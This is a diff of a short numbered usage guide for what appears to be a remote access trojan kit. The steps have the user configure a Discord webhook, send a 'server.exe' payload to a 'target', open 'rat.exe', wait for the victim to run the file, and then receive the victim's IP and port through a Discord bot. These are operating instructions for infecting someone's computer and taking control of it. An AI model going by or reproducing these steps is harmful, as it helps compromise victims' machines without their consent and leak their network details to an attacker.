@@ -1,5 +1,5 @@
 1 edit webhook in webhook.txt and Use MERG.exe IF File webhook.txt is missing You can close MERG.exe now.
-2 send server.exe and webhook.txt to target
+2 send server.exe to target
 3 open rat.exe
 4 wait for target run file 
 5 Wait ip and port in discord bot
